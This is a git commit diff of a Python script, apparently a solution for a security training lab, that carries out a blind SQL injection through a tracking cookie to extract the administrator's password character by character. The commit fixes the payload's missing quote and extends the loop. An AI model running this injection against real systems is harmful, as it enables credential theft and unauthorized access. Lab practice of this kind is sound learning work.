84c0daf18d9465e19058ee52430c995762b046ce
sapi3n-s3c <tyler.ceja5@gmail.com>
2021-09-09 15:54:46 -0400

    fixes script: added closing quote to SQLi payload

--- sqli/LAB-11/sqli-lab-11.py
+++ sqli/LAB-11/sqli-lab-11.py
@@ -12,11 +12,11 @@ proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 def sqli_password(url):
     password_extracted = ''
-    for i in range(1,2):
+    for i in range(1,21):
         for j in range(32, 126): #ascii character range
-            sqli_payload = f" and (select ascii(substring(password,{i},1)) from users where username='administrator')='{j}'--"
+            sqli_payload = f"' and (select ascii(substring(password,{i},1)) from users where username='administrator')='{j}'--"
             sqli_payload_encoded = urllib.parse.quote(sqli_payload)
-            cookie = {'TrackingId': 'AqOqoY4eyu9JK3HB' + sqli_payload_encoded, 'session': 'HCvLsUsdmXqp5egzhaFqOpUqbT1EF7hk'}
+            cookie = {'TrackingId': 'B4vM8CwYcYykJKsm' + sqli_payload_encoded, 'session': 'injG15bhLDLYcZ21JxOl3hEulyV66F7E'}
             r = requests.get(url, cookies=cookie, verify=False, proxies=proxies)
             if 'Welcome' not in r.text:
                 sys.stdout.write('\r' + password_extracted + chr(j))
